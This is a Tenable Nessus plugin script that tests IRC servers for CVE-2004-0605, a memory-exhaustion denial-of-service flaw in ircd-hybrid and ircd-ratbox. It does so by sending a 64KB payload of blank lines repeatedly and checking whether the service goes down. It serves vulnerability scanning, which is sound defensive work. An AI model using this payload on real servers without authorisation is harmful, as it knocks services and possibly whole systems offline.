#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(14253);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2004-0605");
 script_bugtraq_id(10572);
 script_xref(name:"OSVDB", value:"7242");
 
 script_name(english:"Multiple IRC Client Non-registered User parse_client_queued Saturation DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote IRC server is affected by a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of ircd which is vulnerable
to a rate-limiting Denial of Service (DoS) attack.  The flaw is
in the fact that the IRCD daemon reserves more than 500 bytes of
memory for each line received.  

An attacker, exploiting this flaw, would need network access to the
IRC server.  A successful attack would render the IRC daemon, and
possibly the entire system, unusable.

The following IRC daemons are known to be vulnerable:
IRCD-Hybrid ircd-hybrid 7.0.1
ircd-ratbox ircd-ratbox 1.5.1
ircd-ratbox ircd-ratbox 2.0 rc6" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2004-06/0299.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ircd-ratbox 1.5.2 and 2.0rc7 or IRCD-Hybrid 7.0.2." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Multiple IRC daemons Dequeuing DoS check");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_dependencie("find_service1.nasl", "find_service2.nasl", "ircd.nasl");
 script_require_ports("Services/irc", 6667);
 exit(0);
}


port = get_kb_item("Services/irc");
if (!port) 
	port = 6667;

if(! get_port_state(port)) 
	exit(0);

# make sure the socket is actually open before we generate
# a massive req
soc = open_sock_tcp(port);
if (! soc)
	exit(0);

close(soc);

#display("port 6667 is open\n");

req = '';
for (i=0; i<65536; i += 2)
{
        req = req + string(" \n");
}

soc = open_sock_tcp(port);
send(socket:soc, data:req);
close(soc);

for (q=0; q<10; q++)
{
	soc = open_sock_tcp(port);
	if (soc)
	{
		send(socket:soc, data:req);
		close(soc);	
		sleep(3);
	}
	else
	{
		security_warning(port);
		exit(0);
	}
}


